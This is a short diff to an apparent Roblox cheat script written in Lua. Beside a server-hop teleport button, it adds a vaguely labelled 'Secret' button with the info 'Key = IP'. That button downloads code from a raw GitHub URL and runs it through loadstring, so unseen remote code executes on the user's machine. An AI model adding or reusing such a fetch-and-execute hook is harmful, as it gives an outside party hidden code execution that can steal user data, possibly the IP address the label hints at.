@@ -38,6 +38,10 @@ stat:NewButton("Sever Hop", "ButtonInfo", function()
     until Server
     TPS:TeleportToPlaceInstance(_place,Server.id,game.Players.LocalPlayer)
 end)
+
+stat:NewButton("Secret", "Key = IP", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/krymmirai/another/main/test",true))()
+end)
 stat:NewKeybind("KeybindText", "KeybindInfo", Enum.KeyCode.KeypadZero, function()
 	Library:ToggleUI()
 end)
